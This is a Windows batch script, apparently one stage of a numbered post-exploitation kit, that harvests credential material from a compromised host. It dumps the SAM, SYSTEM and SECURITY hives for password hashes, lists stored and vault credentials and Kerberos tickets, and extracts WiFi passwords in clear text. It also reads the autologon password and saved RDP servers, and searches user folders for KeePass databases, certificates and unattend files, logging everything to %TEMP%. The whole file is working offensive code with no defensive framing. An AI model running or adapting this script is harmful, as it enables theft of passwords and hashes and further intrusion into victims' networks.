@echo off
setlocal enabledelayedexpansion
REM ============================================
REM 4_HighValue_Recon.bat - Find credential material
REM Uses built-in certutil/whoami/cmdkey/vaultcmd only
REM Output: %TEMP%\norsat_hv_*.log
REM ============================================

set "OUT=%TEMP%"

echo.
echo === SAM HASHES (Hive Export - needs admin) ===
:: Try as SYSTEM/Admin
reg.exe save "HKLM\SAM" "%OUT%\norsat_sam.hive" /y 2>&1 | findstr /i "error\|success" > "%OUT%\norsat_hv_sam.log"
reg.exe save "HKLM\SYSTEM" "%OUT%\norsat_system.hive" /y 2>&1 | findstr /i "error\|success" >> "%OUT%\norsat_hv_sam.log"
reg.exe save "HKLM\SECURITY" "%OUT%\norsat_security.hive" /y 2>&1 | findstr /i "error\|success" >> "%OUT%\norsat_hv_sam.log"

echo.
echo === STORED CREDS (cmdkey) ===
cmdkey.exe /list > "%OUT%\norsat_hv_creds.log" 2>&1
type "%OUT%\norsat_hv_creds.log"

echo.
echo === VAULT (Credential Manager - needs admin) ===
:: vaultcmd needs admin
vaultcmd.exe /listcreds:"Windows Credentials" > "%OUT%\norsat_hv_vault.log" 2>&1
type "%OUT%\norsat_hv_vault.log"

echo.
echo === CACHED DOMAIN CREDS (in-memory Kerberos tickets) ===
klist.exe tickets > "%OUT%\norsat_hv_tickets.log" 2>&1
type "%OUT%\norsat_hv_tickets.log"

echo.
echo === WIFI CREDENTIALS ===
echo --- List profiles ---
netsh.exe wlan show profiles > "%OUT%\norsat_hv_wifi.log" 2>&1
echo --- Extract cleartext passwords ---
for /f "tokens=2 delims=:" %%P in ('netsh.exe wlan show profiles ^| findstr "All User Profile"') do (
    set "WP=%%P"
    set "WP=!WP:~1!"
    echo --- !WP! ---
    netsh.exe wlan show profile name="!WP!" key=clear >> "%OUT%\norsat_hv_wifi.log" 2>&1
)
type "%OUT%\norsat_hv_wifi.log"

echo.
echo === REGISTRY PASSWORDS / AUTOLOGON (admin needed) ===
reg.exe query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>&1 | findstr /i "DefaultUserName\|DefaultPassword\|AutoAdminLogon" > "%OUT%\norsat_hv_autologon.log"
type "%OUT%\norsat_hv_autologon.log"

echo.
echo === RDP SAVED CREDS ===
reg.exe query "HKCU\Software\Microsoft\Terminal Server Client\Servers" 2>&1 > "%OUT%\norsat_hv_rdp.log"
type "%OUT%\norsat_hv_rdp.log"

echo.
echo === PUTOPS / WINSCP SESSIONS ===
dir "%APPDATA%\PuTTY" /a 2>&1 > "%OUT%\norsat_hv_putty.log"
dir "%APPDATA%\FileZilla" /a 2>&1 >> "%OUT%\norsat_hv_putty.log"
dir "%APPDATA%\WinSCP" /a 2>&1 >> "%OUT%\norsat_hv_putty.log"
dir "%APPDATA%\Microsoft\Credentials" /a 2>&1 >> "%OUT%\norsat_hv_putty.log"
type "%OUT%\norsat_hv_putty.log"

echo.
echo === FIND CRED FILES (kdbx, pem, pfx, unattend) ===
dir /s /b "C:\Users\*.kdbx" "C:\Users\*.pfx" "C:\Users\*.p12" "C:\Users\unattend.xml" "C:\Users\*.vnc" "C:\Users\*.rdp" 2>nul > "%OUT%\norsat_hv_credfiles.log"
type "%OUT%\norsat_hv_credfiles.log"

echo.
echo === DONE ===
dir "%OUT%\norsat_hv_*"
pause
endlocal
